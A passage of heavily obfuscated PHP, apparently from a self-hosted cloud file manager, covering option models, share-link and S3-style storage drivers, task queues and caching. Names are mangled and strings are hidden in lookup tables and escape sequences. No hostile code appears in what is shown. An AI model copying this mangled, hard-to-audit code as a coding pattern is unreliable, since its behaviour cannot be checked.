$æÛé®µÒ =& $_SERVER[ˆûùúÊ¯]; $this->initUserOption(); $•È›çë = $this->findByKey($æÛé®µÒ[2335], $Æàê¹ä[$æÛé®µÒ[451]]); if ($•È›çë) { return !0; } $Ò˜Èø™÷ = array($æÛé®µÒ[2335] => $Æàê¹ä[$æÛé®µÒ[451]], $æÛé®µÒ[42] => $Æàê¹ä[$æÛé®µÒ[42]], $æÛé®µÒ[203] => $Æàê¹ä[$æÛé®µÒ[203]], $æÛé®µÒ[43] => isset($Æàê¹ä[$æÛé®µÒ[43]]) ? $Æàê¹ä[$æÛé®µÒ[43]] : 1, $æÛé®µÒ[2336] => isset($Æàê¹ä[$æÛé®µÒ[2336]]) ? $Æàê¹ä[$æÛé®µÒ[2336]] : 0, $æÛé®µÒ[810] => 0, $æÛé®µÒ[219] => 0); return parent::insert($Ò˜Èø™÷); } public function userNoticeEdit($Œ›±ÏÃÎ, $´šå™ü˜) { $this->initUserOption(); return parent::update($Œ›±ÏÃÎ, $´šå™ü˜); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\x65\155\137\157\160\x74\151\157\x6e"; protected $jsonField = array("\155\x65\156\165", "\162\x6f\154\145", "\162\x6f\x6c\x65\107\162\x6f\x75\x70", "\162\x65\x67\151\163\164", "\x65\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($Å´ï×ï¾) { return "\x53\x79\x73\164\145\155\x4f\x70\x74\x69\x6f\156\x5f{$Å´ï×ï¾}"; } protected function optionDefault($ÔÛã±‰ = '') { $Æ†¤Òšé =& $_SERVER[ˆûùúÊ¯]; if ($ÔÛã±‰ == $Æ†¤Òšé[12]) { return $GLOBALS[$Æ†¤Òšé[6]][$Æ†¤Òšé[433]]; } } } goto C‡í—¡Ü›; A‰­à»å‹„: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($€¼Ÿ›ô) { $this->pathParse = $€¼Ÿ›ô; } protected function infoParse($ê••ºó­, $ö™‡¹§® = false) { $çÊõÉ¸œ =& $_SERVER[ˆûùúÊ¯]; return Action($çÊõÉ¸œ[1235])->sharePathInfo($this->pathParse[$çÊõÉ¸œ[94]], !0, $ö™‡¹§®); } public function listPath($ššœ¤¨á, $ì›Ó®ú§ = false) { $œÑÏã™× =& $_SERVER[ˆûùúÊ¯]; $ÎÙ ¯òà = IO::listPath($ššœ¤¨á, $ì›Ó®ú§); if (!$ÎÙ ¯òà) { return $ÎÙ ¯òà; } if (is_array($ÎÙ ¯òà[$œÑÏã™×[1401]])) { $üª™¾Ë = Action($œÑÏã™×[1410])->parsePathChildren($ÎÙ ¯òà[$œÑÏã™×[1401]], array($œÑÏã™×[471] => $ššœ¤¨á)); $ÎÙ ¯òà[$œÑÏã™×[1401]] = Action($œÑÏã™×[1235])->shareItemInfo($üª™¾Ë); } foreach ($ÎÙ ¯òà as $ıÊËş¼í => $ü§¬ğü) { if (!in_array($ıÊËş¼í, array($œÑÏã™×[93], $œÑÏã™×[92]))) { continue; } foreach ($ü§¬ğü as $¹È©‹şÇ => $üª™¾Ë) { $üª™¾Ë = Action($œÑÏã™×[1410])->parsePathChildren($üª™¾Ë, array($œÑÏã™×[471] => $ššœ¤¨á)); $ÎÙ ¯òà[$ıÊËş¼í][$¹È©‹şÇ] = Action($œÑÏã™×[1235])->shareItemInfo($üª™¾Ë); } } return $ÎÙ ¯òà; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($èÀÑÒ­) { parent::__construct($èÀÑÒ­); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¸è´áÇ½) { parent::__construct($¸è´áÇ½); $this->signatureVersion($_SERVER[ˆûùúÊ¯][240]); } public function uploadFormData($¡Úğµ–É, $–‚¢®¯ä = 3600) { $üÏ©º‚ =& $_SERVER[ˆûùúÊ¯]; $‰ŞÙóíø = $üÏ©º‚[222]; $¡•”ø = $üÏ©º‚[261]; $ú€ÖÑ¶ı = $üÏ©º‚[72]; $¶§’Çá = gmdate($üÏ©º‚[262]); $Í¡ØãşÃ = gmdate($üÏ©º‚[263]); $×÷‚Öıè = $üÏ©º‚[264]; $š°†øŸï = $–‚¢®¯ä . $üÏ©º‚[12]; $äÌêñĞÄ = $üÏ©º‚[265]; $õäªÏÀõ = array($this->accessKey, $Í¡ØãşÃ, $this->region, $ú€ÖÑ¶ı, $×÷‚Öıè); $—™¾˜éî = implode($üÏ©º‚[8], $õäªÏÀõ); $¨£êş¼ß = array($üÏ©º‚[266] => gmdate($üÏ©º‚[1385], strtotime($üÏ©º‚[268])), $üÏ©º‚[269] => array(array($üÏ©º‚[270] => $this->bucket), array($üÏ©º‚[271] => $‰ŞÙóíø), array($üÏ©º‚[272], $üÏ©º‚[273], $üÏ©º‚[12]), array($üÏ©º‚[272], $üÏ©º‚[274], $üÏ©º‚[12]), array($üÏ©º‚[272], $üÏ©º‚[275], $üÏ©º‚[12]), array($üÏ©º‚[276] => $äÌêñĞÄ), array($üÏ©º‚[277] => $—™¾˜éî), array($üÏ©º‚[278] => $¡•”ø), array($üÏ©º‚[279] => $¶§’Çá), array($üÏ©º‚[280] => $š°†øŸï))); $–ªÔ’â = base64_encode(json_encode($¨£êş¼ß)); $åü¨¸£ = hash_hmac($üÏ©º‚[281], $Í¡ØãşÃ, $üÏ©º‚[282] . $this->secret, !0); $±½íò¬ = hash_hmac($üÏ©º‚[281], $this->region, $åü¨¸£, !0); $ğÓãæå = hash_hmac($üÏ©º‚[281], $ú€ÖÑ¶ı, $±½íò¬, !0); $õ•Ø›² = hash_hmac($üÏ©º‚[281], $×÷‚Öıè, $ğÓãæå, !0); $¶«÷‰ôî = hash_hmac($üÏ©º‚[281], $–ªÔ’â, $õ•Ø›²); $èô£°âÄ = array($üÏ©º‚[239] => $üÏ©º‚[12], $üÏ©º‚[283] => $üÏ©º‚[12], $üÏ©º‚[271] => $‰ŞÙóíø, $üÏ©º‚[276] => $äÌêñĞÄ, $üÏ©º‚[284] => $–ªÔ’â, $üÏ©º‚[285] => $—™¾˜éî, $üÏ©º‚[286] => $¡•”ø, $üÏ©º‚[287] => $¶§’Çá, $üÏ©º‚[288] => $š°†øŸï, $üÏ©º‚[289] => $¶«÷‰ôî, $üÏ©º‚[205] => $this->getHost()); return $èô£°âÄ; } } goto A¦²‚´Ã¬; CÉ•–«ãâ: class TaskHttp extends Task { protected function startAfter() { $›ª¬ŒÅ– =& $_SERVER[ˆûùúÊ¯]; $ºõï«ƒš =& $this->task; $ºõï«ƒš[$›ª¬ŒÅ–[1781]] = 1; Hook::bind($›ª¬ŒÅ–[1749], array($this, $›ª¬ŒÅ–[1782])); Hook::bind($›ª¬ŒÅ–[1751], array($this, $›ª¬ŒÅ–[1783])); Hook::bind($›ª¬ŒÅ–[1753], array($this, $›ª¬ŒÅ–[1784])); } protected function endAfter() { $÷Œœã– =& $_SERVER[ˆûùúÊ¯]; Hook::unbind($÷Œœã–[1749], array($this, $÷Œœã–[1782])); Hook::unbind($÷Œœã–[1751], array($this, $÷Œœã–[1783])); Hook::unbind($÷Œœã–[1753], array($this, $÷Œœã–[1784])); } public function progressStart($íØç™Ğä) { $éâéë ü =& $_SERVER[ˆûùúÊ¯]; $Óã¥Œ› = curl_getinfo($íØç™Ğä); self::log($éâéë ü[1785] . $Óã¥Œ›[$éâéë ü[359]]); self::valueSet($this->task[$éâéë ü[451]], $this->task); } public function progressEnd($à•×”Ï) { $ğø—Ô† =& $_SERVER[ˆûùúÊ¯]; self::log($ğø—Ô†[1786] . $this->task[$ğø—Ô†[451]]); $this->end(); } public function progress($ÜÌø¨ã, $¢ˆ½¶ñ³, $†×Ûğâ¦, $Â¶œ‰ĞÜ, $›Å¡™†õ) { $¥ÚÑ¤Ä² =& $_SERVER[ˆûùúÊ¯]; $âšå®ğÌ =& $this->task; if ($›Å¡™†õ > 0) { $âšå®ğÌ[$¥ÚÑ¤Ä²[846]] = $âšå®ğÌ[$¥ÚÑ¤Ä²[846]] == 0 ? $Â¶œ‰ĞÜ : $âšå®ğÌ[$¥ÚÑ¤Ä²[846]]; $âšå®ğÌ[$¥ÚÑ¤Ä²[1705]] = $›Å¡™†õ; } else { if ($†×Ûğâ¦ > 0) { $âšå®ğÌ[$¥ÚÑ¤Ä²[846]] = $âšå®ğÌ[$¥ÚÑ¤Ä²[846]] == 0 ? $¢ˆ½¶ñ³ : $âšå®ğÌ[$¥ÚÑ¤Ä²[846]]; $âšå®ğÌ[$¥ÚÑ¤Ä²[1705]] = $†×Ûğâ¦; } } $this->update(); self::log("\160\162\x6f\x67\162\x65\x73\163\x48\x74\164\x70\x3a\144\157\x77\156\72{$†×Ûğâ¦}\x2f{$¢ˆ½¶ñ³}\x3b\40\x75\x70\154\157\141\144\x3a{$›Å¡™†õ}\57{$Â¶œ‰ĞÜ}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($èóæÅ™, $µÚ“ ‡ = '', $çÃµû²ı = 0, $¿ó©”È = '') { $³¨Úó˜× =& $_SERVER[ˆûùúÊ¯]; $Ñ“›©·± = new Task($èóæÅ™, $µÚ“ ‡, $çÃµû²ı, $¿ó©”È); $GLOBALS[$³¨Úó˜×[1787] . $èóæÅ™] = new TaskLog($³¨Úó˜×[1688], $Ñ“›©·±, $¿ó©”È); return $Ñ“›©·±; } public function __construct($èš™Ş’œ = '', $¨Ëóı¨Ï = '', $Õö¼€Ä¶ = '') { $ì¶Ã«¦æ =& $_SERVER[ˆûùúÊ¯]; if (!$èš™Ş’œ) { $èš™Ş’œ = $ì¶Ã«¦æ[1688]; } $•À¼€Ä› = $èš™Ş’œ . $ì¶Ã«¦æ[438] . rand_string(10); if (!$Õö¼€Ä¶) { $Õö¼€Ä¶ = $èš™Ş’œ . $ì¶Ã«¦æ[63] . $Õö¼€Ä¶; } switch ($èš™Ş’œ) { case $ì¶Ã«¦æ[1688]: if (!$¨Ëóı¨Ï || !$¨Ëóı¨Ï->task) { return echoLog($èš™Ş’œ . $ì¶Ã«¦æ[1788]); } $«¢§Ô• = $¨Ëóı¨Ï; $•À¼€Ä› = $«¢§Ô•->task[$ì¶Ã«¦æ[451]]; $èš™Ş’œ = $«¢§Ô•->task[$ì¶Ã«¦æ[451]]; if (!$«¢§Ô•->task[$ì¶Ã«¦æ[1601]]) { $«¢§Ô•->task[$ì¶Ã«¦æ[1601]] = $Õö¼€Ä¶ ? $Õö¼€Ä¶ : $èš™Ş’œ; } break; case $ì¶Ã«¦æ[1789]: if (!$¨Ëóı¨Ï) { return echoLog($èš™Ş’œ . $ì¶Ã«¦æ[1790]); } $…áúƒØê = is_string($¨Ëóı¨Ï) ? array($¨Ëóı¨Ï) : $¨Ëóı¨Ï; $«¢§Ô• = new TaskFileTransfer($•À¼€Ä›, $èš™Ş’œ, 0, $Õö¼€Ä¶ ? $Õö¼€Ä¶ : $…áúƒØê[0]); foreach ($…áúƒØê as $œ‹““™×) { $«¢§Ô•->addPath($œ‹““™×); } break; case $ì¶Ã«¦æ[365]: if (!$¨Ëóı¨Ï) { return echoLog($èš™Ş’œ . $ì¶Ã«¦æ[1790]); } $…áúƒØê = is_string($¨Ëóı¨Ï) ? array($¨Ëóı¨Ï) : $¨Ëóı¨Ï; $«¢§Ô• = new TaskZip($•À¼€Ä›, $èš™Ş’œ, 0, $Õö¼€Ä¶ ? $Õö¼€Ä¶ : $…áúƒØê[0]); foreach ($…áúƒØê as $œ‹““™×) { $«¢§Ô•->addPath($œ‹““™×); } break; case $ì¶Ã«¦æ[1275]: if (!$¨Ëóı¨Ï) { return echoLog($èš™Ş’œ . $ì¶Ã«¦æ[1790]); } $«¢§Ô• = new TaskUnZip($•À¼€Ä›, $èš™Ş’œ, 0, $Õö¼€Ä¶ ? $Õö¼€Ä¶ : $¨Ëóı¨Ï); if ($¨Ëóı¨Ï) { $«¢§Ô•->addFile($¨Ëóı¨Ï); } break; case $ì¶Ã«¦æ[158]: $«¢§Ô• = new TaskHttp($•À¼€Ä›, $èš™Ş’œ); break; default: return; break; } $this->task = $«¢§Ô•; $this->taskID = $•À¼€Ä›; Hook::bind($ì¶Ã«¦æ[1725], array($this, $ì¶Ã«¦æ[1791])); Hook::bind($ì¶Ã«¦æ[1727], array($this, $ì¶Ã«¦æ[1792])); Hook::bind($ì¶Ã«¦æ[1721], array($this, $ì¶Ã«¦æ[1793])); echoLog($ì¶Ã«¦æ[1794] . $«¢§Ô•->task[$ì¶Ã«¦æ[1601]]); } public function __destruct() { $this->end(); } public function end($ËĞ ŞÀş = '') { $”ºŸ‚ĞÆ =& $_SERVER[ˆûùúÊ¯]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ËĞ ŞÀş); $this->task = !1; $this->taskID = !1; Hook::unbind($”ºŸ‚ĞÆ[1725], array($this, $”ºŸ‚ĞÆ[1791])); Hook::unbind($”ºŸ‚ĞÆ[1727], array($this, $”ºŸ‚ĞÆ[1792])); Hook::unbind($”ºŸ‚ĞÆ[1721], array($this, $”ºŸ‚ĞÆ[1793])); } public function taskUpdate($öœß¦ÃÙ) { $«à¶áç =& $_SERVER[ˆûùúÊ¯]; if (!$öœß¦ÃÙ || $this->taskID != $öœß¦ÃÙ[$«à¶áç[451]]) { return; } $¸É±ç = 20; $í•ƒ¬”ú = intval($öœß¦ÃÙ[$«à¶áç[1706]] * $¸É±ç); $ô“üó˜à = $«à¶áç[172] . str_repeat($«à¶áç[945], $í•ƒ¬”ú) . $«à¶áç[1075] . str_repeat($«à¶áç[63], $¸É±ç - $í•ƒ¬”ú) . $«à¶áç[174]; $³Áí¢€ = $ô“üó˜à . sprintf($«à¶áç[1795], $öœß¦ÃÙ[$«à¶áç[1706]] * 100) . $«à¶áç[1796]; $Ğğ—ü = $³Áí¢€ . $öœß¦ÃÙ[$«à¶áç[1705]] . $«à¶áç[8] . $öœß¦ÃÙ[$«à¶áç[846]] . LNG($«à¶áç[1797]); $›áæš‘ = $«à¶áç[12]; if ($öœß¦ÃÙ[$«à¶áç[1781]]) { $Ğğ—ü = $³Áí¢€ . size_format($öœß¦ÃÙ[$«à¶áç[1705]]) . $«à¶áç[8] . size_format($öœß¦ÃÙ[$«à¶áç[846]]); $›áæš‘ = size_format($öœß¦ÃÙ[$«à¶áç[1707]]) . $«à¶áç[1798]; } if ($öœß¦ÃÙ[$«à¶áç[1125]]) { $öœß¦ÃÙ[$«à¶áç[1755]] = $öœß¦ÃÙ[$«à¶áç[1125]] . $«à¶áç[63] . $öœß¦ÃÙ[$«à¶áç[1755]]; } if ($öœß¦ÃÙ[$«à¶áç[1755]]) { $şÌßìÒ = $«à¶áç[12]; if ($öœß¦ÃÙ[$«à¶áç[1757]]) { $şÌßìÒ = $«à¶áç[60] . size_format($öœß¦ÃÙ[$«à¶áç[1758]]) . $«à¶áç[8] . size_format($öœß¦ÃÙ[$«à¶áç[1757]]); } $›áæš‘ .= $öœß¦ÃÙ[$«à¶áç[1755]] . $şÌßìÒ; } if ($öœß¦ÃÙ[$«à¶áç[823]] && !$öœß¦ÃÙ[$«à¶áç[1757]]) { $›áæš‘ .= $«à¶áç[63] . size_format($öœß¦ÃÙ[$«à¶áç[1762]]) . $«à¶áç[8] . size_format($öœß¦ÃÙ[$«à¶áç[823]]); } echoLog($Ğğ—ü . $«à¶áç[63] . $›áæš‘, !0); } public function taskEnd($½–ß³ğî) { $¼Ø–ĞÃ =& $_SERVER[ˆûùúÊ¯]; if (!$½–ß³ğî || $this->taskID != $½–ß³ğî[$¼Ø–ĞÃ[451]]) { return; } $ÎÒã÷®é = $½–ß³ğî ? $½–ß³ğî[$¼Ø–ĞÃ[1705]] . $¼Ø–ĞÃ[8] . $½–ß³ğî[$¼Ø–ĞÃ[846]] . LNG($¼Ø–ĞÃ[1797]) . $¼Ø–ĞÃ[81] : $¼Ø–ĞÃ[12]; echoLog($¼Ø–ĞÃ[1799] . $½–ß³ğî[$¼Ø–ĞÃ[1601]] . ($½–ß³ğî[$¼Ø–ĞÃ[502]] ? $¼Ø–ĞÃ[81] . $½–ß³ğî[$¼Ø–ĞÃ[502]] : $¼Ø–ĞÃ[12]) . $¼Ø–ĞÃ[81] . $ÎÒã÷®é . $¼Ø–ĞÃ[1800] . sprintf($¼Ø–ĞÃ[911], timeFloat() - $½–ß³ğî[$¼Ø–ĞÃ[1708]]) . $¼Ø–ĞÃ[1720]); $this->end(); } public function taskKill($å ¤àÌ¿) { $ıÔ£şÊŒ =& $_SERVER[ˆûùúÊ¯]; if (!$å ¤àÌ¿ || $this->taskID != $å ¤àÌ¿[$ıÔ£şÊŒ[451]]) { return; } echoLog($ıÔ£şÊŒ[1801] . $å ¤àÌ¿[$ıÔ£şÊŒ[1601]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\153\121\x75\x65\165\145\x4c\145\x6e\147\x74\150"; const QUEUE_DATA = "\x74\x61\163\153\121\165\x65\x75\145\104\x61\x74\x61"; const QUEUE_TIME = "\x74\141\x73\x6b\121\x75\145\x75\x65\x4c\x61\163\x74\x52\x75\156"; const QUEUE_THREAD = "\x74\x61\163\x6b\121\x75\x65\165\145\124\150\x72\145\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Öåôõ, $‰ê®”Æ€ = array(), $ö»Æüô = '', $ëúãà˜½ = '') { $‚Ì³º¤Û =& $_SERVER[ˆûùúÊ¯]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ëúãà˜½ && array_find_by_field(self::$listData, $‚Ì³º¤Û[104], $ëúãà˜½)) { return !0; } if ($ëúãà˜½ && array_find_by_field(self::$listDataAdd, $‚Ì³º¤Û[104], $ëúãà˜½)) { return !0; } self::$listDataAdd[] = array($‚Ì³º¤Û[316] => $Öåôõ, $‚Ì³º¤Û[1802] => $‰ê®”Æ€, $‚Ì³º¤Û[502] => $ö»Æüô, $‚Ì³º¤Û[104] => $ëúãà˜½); return !0; } public static function addSubmit() { $À¢Şù˜ó =& $_SERVER[ˆûùúÊ¯]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($À¢Şù˜ó[1803] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $À¢Şù˜ó[12], $À¢Şù˜ó[502])), $À¢Şù˜ó[194]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($Ñ×ï…ë, $·©­¤Ò‰ = array(), $®õƒ¥´ş = '', $º‡’Ò = '') { $ïÊú‡Êù =& $_SERVER[ˆûùúÊ¯]; if (self::count() >= self::MAX_LENGTH) { return !1; } $£×Íßª” = self::getAll(); if ($º‡’Ò && array_find_by_field($£×Íßª”, $ïÊú‡Êù[104], $º‡’Ò)) { return !0; } $£×Íßª”[] = array($ïÊú‡Êù[316] => $Ñ×ï…ë, $ïÊú‡Êù[1802] => $·©­¤Ò‰, $ïÊú‡Êù[502] => $®õƒ¥´ş, $ïÊú‡Êù[104] => $º‡’Ò); self::setAll($£×Íßª”); write_log($ïÊú‡Êù[1803] . $®õƒ¥´ş, $ïÊú‡Êù[194]); return !0; } public static function run() { $—•äà³° =& $_SERVER[ˆûùúÊ¯]; $òƒŒ©ò = self::getAll(); $Ù”Ş¾ğ = array_shift($òƒŒ©ò); if (!$Ù”Ş¾ğ) { return !1; } self::setAll($òƒŒ©ò); $Í®ùÁ› = timeFloat(); $çûÜˆ¦¾ = $—•äà³°[12]; try { $çûÜˆ¦¾ = Hook::apply($Ù”Ş¾ğ[$—•äà³°[316]], $Ù”Ş¾ğ[$—•äà³°[1802]]); } catch (Exception $¤ôùï) { write_log($¤ôùï, $—•äà³°[1243]); } $Ç±ú²òª = number_format(timeFloat() - $Í®ùÁ›, 3) . $—•äà³°[1720]; if ($çûÜˆ¦¾ && is_string($çûÜˆ¦¾)) { $Ç±ú²òª = $Ç±ú²òª . $—•äà³°[1804] . $çûÜˆ¦¾; } write_log($—•äà³°[1805] . $Ù”Ş¾ğ[$—•äà³°[502]] . $—•äà³°[1806] . $Ç±ú²òª, $—•äà³°[194]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Ñş©†Ó… =& $_SERVER[ˆûùúÊ¯]; $êàûñşé = self::threadCount() + 1; if ($êàûñşé > 3 || !self::count()) { return; } write_log($Ñş©†Ó…[1807] . $êàûñşé, $Ñş©†Ó…[194]); Cache::set(self::QUEUE_THREAD, $êàûñşé, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Ñş©†Ó…[1808], $Ñş©†Ó…[194]); } public static function getKey($û³·âç„, $îò™ºŠÍ = "\x69\x6e\x74") { $şñ·ıËˆ =& $_SERVER[ˆûùúÊ¯]; Cache::removeMemory($û³·âç„); $Ÿ½¤¿å = Cache::get($û³·âç„); if ($îò™ºŠÍ == $şñ·ıËˆ[340]) { return $Ÿ½¤¿å ? intval($Ÿ½¤¿å) : 0; } if ($îò™ºŠÍ == $şñ·ıËˆ[1809]) { return is_array($Ÿ½¤¿å) ? $Ÿ½¤¿å : array(); } return $Ÿ½¤¿å; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ˆûùúÊ¯][1809]); } public static function setAll($Å™¯ıãƒ) { $‹Æáæ¶ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Å™¯ıãƒ), $‹Æáæ¶); Cache::set(self::QUEUE_DATA, $Å™¯ıãƒ, $‹Æáæ¶); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto e¯‡àßèÑ–; C”ÖéÌï‰: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ÓôšóÅ =& $_SERVER[ˆûùúÊ¯]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ªö–õóí = $GLOBALS[$ÓôšóÅ[6]][$ÓôšóÅ[401]]; $ûÃ©Æ×“ = $ªö–õóí[$ªö–õóí[$ÓôšóÅ[887]]]; $åë•ÀïÊ = $ªö–õóí[$ÓôšóÅ[888]]; switch ($ªö–õóí[$ÓôšóÅ[887]]) { case $ÓôšóÅ[31]: self::$handle = Model($ÓôšóÅ[889]); break; case $ÓôšóÅ[890]: self::$handle = new CacheRedis($ûÃ©Æ×“, $åë•ÀïÊ); break; case $ÓôšóÅ[891]: self::$handle = new CacheMemcached($ûÃ©Æ×“, $åë•ÀïÊ); break; case $ÓôšóÅ[223]: self::$handle = new CacheFile($ûÃ©Æ×“, $åë•ÀïÊ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($šµïş) { if (is_array($šµïş) || is_object($šµïş)) { $šµïş = json_encode($šµïş); } $šµïş = rawurlencode($šµïş); return md5(KOD_SITE_ID . $_SERVER[ˆûùúÊ¯][11] . $šµïş); } public static function get($àğùğ¨˜, $ùò÷ªï¦ = false) { $°ŒĞÀ = self::key($àğùğ¨˜); $åØ¸«ˆ = self::init(); if ($ùò÷ªï¦) { return unserialize($åØ¸«ˆ->get($°ŒĞÀ)); } if (!isset(self::$memoryCache[$°ŒĞÀ])) { $—¤ñã¥ƒ = $åØ¸«ˆ->get($°ŒĞÀ); self::$memoryCache[$°ŒĞÀ] = unserialize($—¤ñã¥ƒ); } return self::$memoryCache[$°ŒĞÀ]; } public static function set($Íƒà¨ß, $ºıÂ¨á±, $êÏ¶ù±° = false) { $ûçÛÄû½ =& $_SERVER[ˆûùúÊ¯]; $Óõ’ª±Œ = self::key($Íƒà¨ß); if (isset(self::$memoryCache[$Óõ’ª±Œ]) && self::$memoryCache[$Óõ’ª±Œ] === $ºıÂ¨á±) { return !0; } if ($êÏ¶ù±° === 0) { self::$memoryCache[$Óõ’ª±Œ] = $ºıÂ¨á±; return !0; } $ìş•Áèá = self::init(); $‹ç¦Ù­‡ = serialize($ºıÂ¨á±); CacheLock::lock($Íƒà¨ß . $ûçÛÄû½[892]); $²—Â¾°ê = $ìş•Áèá->set($Óõ’ª±Œ, $‹ç¦Ù­‡, $êÏ¶ù±°); self::$memoryCache[$Óõ’ª±Œ] = $ºıÂ¨á±; CacheLock::unlock($Íƒà¨ß . $ûçÛÄû½[892]); return $²—Â¾°ê; } public static function getCall($üŞÎŸ¨×, $Î†êÎ³•, $ğ˜­—ëŸ, $°˜»í®… = array()) { $õî¶ï¹Ü =& $_SERVER[ˆûùúÊ¯]; $Í¤Œ‡ñÁ = self::get($üŞÎŸ¨×); if ($Í¤Œ‡ñÁ || $Í¤Œ‡ñÁ === $õî¶ï¹Ü[12]) { return $Í¤Œ‡ñÁ; } $Í¤Œ‡ñÁ = call_user_func_array($ğ˜­—ëŸ, $°˜»í®…); $Í¤Œ‡ñÁ = $Í¤Œ‡ñÁ ? $Í¤Œ‡ñÁ : $õî¶ï¹Ü[12]; self::set($üŞÎŸ¨×, $Í¤Œ‡ñÁ, $Î†êÎ³•); return $Í¤Œ‡ñÁ; } public static function remove($Üƒ¶®‚Î) { $æÏ³¤úæ = self::key($Üƒ¶®‚Î); unset(self::$memoryCache[$æÏ³¤úæ]); self::clearTimeout(); CacheLock::lock($Üƒ¶®‚Î); $®’íúÙ = self::init()->remove($æÏ³¤úæ); CacheLock::unlock($Üƒ¶®‚Î); return $®’íúÙ; } public static function removeMemory($Ù»¡ëêä) { $îÇ´äò¶ = self::key($Ù»¡ëêä); unset(self::$memoryCache[$îÇ´äò¶]); } public static function clearMemory($ªĞ¥˜Åƒ = false) { if ($ªĞ¥˜Åƒ) { $ªĞ¥˜Åƒ = self::key($ªĞ¥˜Åƒ); unset(self::$memoryCache[$ªĞ¥˜Åƒ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ˆûùúÊ¯][893])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ˆûùúÊ¯][894])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ÌşÕ, $¿¨ÈÓ˜) { $ÎÒ¼ÌÁ¤ =& $_SERVER[ˆûùúÊ¯]; $this->cachePath = $ÌşÕ[$ÎÒ¼ÌÁ¤[94]]; $this->prefix = $ÎÒ¼ÌÁ¤[895]; $this->cacheTime = $¿¨ÈÓ˜; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($§†ÏªÑ) { $¢‚½›¸“ =& $_SERVER[ˆûùúÊ¯]; $§†ÏªÑ = str_replace(array($¢‚½›¸“[896], $¢‚½›¸“[107], $¢‚½›¸“[83]), $¢‚½›¸“[897], $§†ÏªÑ); return $this->cachePath . $¢‚½›¸“[898] . $§†ÏªÑ . $¢‚½›¸“[899]; } public function set($™ô”¿ñË, $š«‹‹Ÿ, $ÏãñÅˆ× = false) { $ÏãñÅˆ× = $ÏãñÅˆ× ? $ÏãñÅˆ× : $this->cacheTime; $ÏûË¾Ş = $this->getFile($™ô”¿ñË); if (file_put_contents($ÏûË¾Ş, $this->prefix . $š«‹‹Ÿ, LOCK_EX)) { @touch($ÏûË¾Ş, intval(time() + $ÏãñÅˆ×)); clearstatcache(); return !0; } @unlink($ÏûË¾Ş); return !1; } public function get($œı¶‹ìğ) { $¤€»ÄğŒ = $this->getFile($œı¶‹ìğ); if (file_exists($¤€»ÄğŒ) && filemtime($¤€»ÄğŒ) < time()) { @unlink($¤€»ÄğŒ); return !1; } $âÒôë¸× = @file_get_contents($¤€»ÄğŒ); return substr($âÒôë¸×, strlen($this->prefix)); } public function remove($Ş†Ğö÷) { $øğõ¤íÈ = $this->getFile($Ş†Ğö÷); return @unlink($øğõ¤íÈ); } public function deleteAll() { $Ô‘ÒÏ¸ =& $_SERVER[ˆûùúÊ¯]; $ÁåâÔæ¤ = scandir($this->cachePath); foreach ($ÁåâÔæ¤ as $øØÂ¦†Å) { $ÆØÉÍë· = $this->cachePath . $øØÂ¦†Å; if (strpos($ÆØÉÍë·, $Ô‘ÒÏ¸[899]) && strpos($ÆØÉÍë·, $Ô‘ÒÏ¸[900])) { @unlink($ÆØÉÍë·); } } } public function clearTimeout() { $ß‚‰ÑÓó =& $_SERVER[ˆûùúÊ¯]; $¾ÂÓ˜š = scandir($this->cachePath); foreach ($¾ÂÓ˜š as $ñ‹¹äÛ©) { $õÏ—‘‘¹ = $this->cachePath . $ñ‹¹äÛ©; if (strpos($õÏ—‘‘¹, $ß‚‰ÑÓó[899]) && strpos($õÏ—‘‘¹, $ß‚‰ÑÓó[900]) && filemtime($õÏ—‘‘¹) < time()) { @unlink($õÏ—‘‘¹); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $§Ü˜Ñ±­ =& $_SERVER[ˆûùúÊ¯]; if (self::$handle) { return self::$handle; } $‰×ì¥äş = $GLOBALS[$§Ü˜Ñ±­[6]][$§Ü˜Ñ±­[401]]; self::$timeout = $‰×ì¥äş[$§Ü˜Ñ±­[901]] ? $‰×ì¥äş[$§Ü˜Ñ±­[901]] : 10; $Ô©ÙéÊ¶ = _get($GLOBALS[$§Ü˜Ñ±­[6]], $§Ü˜Ñ±­[902]); $÷£Íè“Ë = 